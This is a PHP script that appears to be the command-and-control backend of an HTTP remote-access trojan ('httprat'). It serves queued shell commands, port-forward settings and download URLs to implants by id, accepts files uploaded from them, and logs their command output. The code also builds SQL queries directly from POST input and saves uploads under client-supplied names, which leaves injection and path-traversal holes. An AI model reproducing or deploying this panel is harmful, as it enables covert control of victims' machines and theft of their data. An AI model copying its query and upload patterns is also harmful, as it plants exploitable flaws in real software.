<?php

require("config.php");

error_reporting(E_ALL ^ E_NOTICE);//��ʾ��ȥ E_NOTICE ֮������д�����Ϣ

$mysqli = new mysqli($dbaddr,$username,$password,$dbname);
if(mysqli_connect_error())
{
	printf("���ݿ�����ʧ�ܣ�%s\n",mysqli_connect_error());
	exit();
}

	
//��server��id��POST��ʽ�ύ��Webʱ����id�ŵ����ݿ��в�ѯ����������ظ�server	
if (($_POST["ver"]!=NULL)&&($_POST["id"] != NULL)&&($_POST["type"]=='shell'))
{
	$idout = $_POST["id"];
	$result = $mysqli->query("SELECT shell FROM httprat WHERE id = '$idout'");
	$row = $result->fetch_assoc();
	printf("%s%s","REP",$row["shell"]) ;
	$time = date("Y-n-j H:i:s");
	$mysqli->query("UPDATE status SET shellLT = '$time' WHERE id = '$idout'");	
	$mysqli->query("UPDATE httprat SET shell = 'donothing' WHERE id = '$idout'"); 

	$result->close();
}

if (($_POST["ver"]!=NULL)&&($_POST["id"] != NULL)&&($_POST["type"]=='tran'))
{
	$idout = $_POST["id"];
	$result = $mysqli->query("SELECT ports FROM httprat WHERE id = '$idout'");
	$row = $result->fetch_assoc();
	printf("%s%s","REP",$row["ports"]) ;
	$time = date("Y-n-j H:i:s");
	$mysqli->query("UPDATE status SET tranLT = '$time' WHERE id = '$idout'");
	$mysqli->query("UPDATE httprat SET ports = 'donothing' WHERE id = '$idout'"); 
	$result->close();
}


if (($_POST["ver"]!=NULL)&&($_POST["id"] != NULL)&&($_POST["type"]=='download'))
{
	$idout = $_POST["id"];
	$result = $mysqli->query("SELECT * FROM httprat WHERE id = '$idout'");
	$row = $result->fetch_assoc();
	printf("%s%s^%s","REP",$row["url"],$row["filename"]) ;
	
	$mysqli->query("UPDATE httprat SET url = 'donothing' WHERE id = '$idout'"); 
	$mysqli->query("UPDATE httprat SET filename = 'donothing' WHERE id = '$idout'"); 

	$result->close();
}


if (($_FILES["file"]["type"] == "image/gif")
|| ($_FILES["file"]["type"] == "image/jpeg")
|| ($_FILES["file"]["type"] == "image/pjpeg"))
{
	if ($_FILES["file"]["error"] > 0)
	{
		echo "Return Code: " . $_FILES["file"]["error"] . "<br />";
	}
	else
	{
		echo "Upload: " . $_FILES["file"]["name"] . "<br />";
		echo "Type: " . $_FILES["file"]["type"] . "<br />";
		echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
		echo "Temp file: " . $_FILES["file"]["tmp_name"] . "<br />";

		if (file_exists("upload/" . $_FILES["file"]["name"]))
			{
				unlink("upload/" . $_FILES["file"]["name"]);
			}

			{
				move_uploaded_file($_FILES["file"]["tmp_name"],
				"upload/" . $_FILES["file"]["name"]);
				echo "Stored in: " . "upload/" . $_FILES["file"]["name"];
			}
	}
}

//���������д���ļ�

if($_POST["output"]!=NULL)
{
	$output = $_POST["output"];
	$handle1 = fopen("output.txt","a+");
	fwrite($handle1,$output);
	fclose($handle1);
}
//�������


$mysqli->close();

?>